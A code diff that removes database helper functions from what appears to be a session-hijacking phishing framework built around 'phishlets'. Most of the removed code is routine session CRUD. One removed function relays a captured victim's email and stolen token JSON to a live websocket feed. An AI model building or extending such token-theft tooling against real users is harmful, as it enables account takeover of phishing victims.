@@ -124,29 +124,6 @@ func HandleCapturedCookieSession(rid string, tokens map[string]map[string]*Cooki
 	return err
 }
 
-func HandleCapturedOtherSession(rid string, tokens map[string]string, browser map[string]string, livefeed bool) error {
-	if !livefeed {
-		return nil
-	}
-	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
-	if err != nil {
-		return err
-	}
-	defer c.Close()
-	fe := FeedEvent{}
-	fe.Event = "Captured Session"
-	fe.Message = "Captured session for victim: **" + browser["email"] + "**! View full token JSON below!"
-	fe.Time = time.Now().String()
-	json_tokens, _ := json.Marshal(tokens)
-	fe.Tokens = string(json_tokens)
-	data, _ := json.Marshal(fe)
-	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
-	if err != nil {
-		return err
-	}
-	return err
-}
-
 func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
 	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
 	return err
@@ -155,16 +132,6 @@ func (d *Database) CreateSession(sid string, phishlet string, landing_url string
 func (d *Database) ListSessions() ([]*Session, error) {
 	s, err := d.sessionsList()
 	return s, err
-}
-
-func (d *Database) SetSessionTmsgid(sid string, tmsgid string) error {
-	err := d.sessionsUpdateTmsgid(sid, tmsgid)
-	return err
-}
-
-func (d *Database) SetSessionCmsgid(sid string, cmsgid string) error {
-	err := d.sessionsUpdateCmsgid(sid, cmsgid)
-	return err
 }
 
 func (d *Database) SetSessionUsername(sid string, username string) error {
@@ -197,15 +164,6 @@ func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[stri
 	return err
 }
 
-func (d *Database) DeleteSession(sid string) error {
-	s, err := d.sessionsGetBySid(sid)
-	if err != nil {
-		return err
-	}
-	err = d.sessionsDelete(s.Id)
-	return err
-}
-
 func (d *Database) DeleteSessionById(id int) error {
 	_, err := d.sessionsGetById(id)
 	if err != nil {
@@ -221,22 +179,6 @@ func (d *Database) Flush() {
 
 func (d *Database) genIndex(table_name string, id int) string {
 	return table_name + ":" + strconv.Itoa(id)
-}
-
-func (d *Database) getLastId(table_name string) (int, error) {
-	var id int = 1
-	var err error
-	err = d.db.View(func(tx *buntdb.Tx) error {
-		var s_id string
-		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
-			return err
-		}
-		if id, err = strconv.Atoi(s_id); err != nil {
-			return err
-		}
-		return nil
-	})
-	return id, err
 }
 
 func (d *Database) getNextId(table_name string) (int, error) {
@@ -262,14 +204,4 @@ func (d *Database) getPivot(t interface{}) string {
 
 func (d *Database) GetSessionById(id int) (*Session, error) {
 	return d.sessionsGetById(id)
-}
-
-func (d *Database) MarkSessionReviewed(id int) error {
-	s, err := d.sessionsGetById(id)
-	if err != nil {
-		return err
-	}
-	// Add a Reviewed field update - we'll mark it in the UpdateTime
-	s.UpdateTime = time.Now().UTC().Unix()
-	return d.sessionsUpdate(id, s)
 }
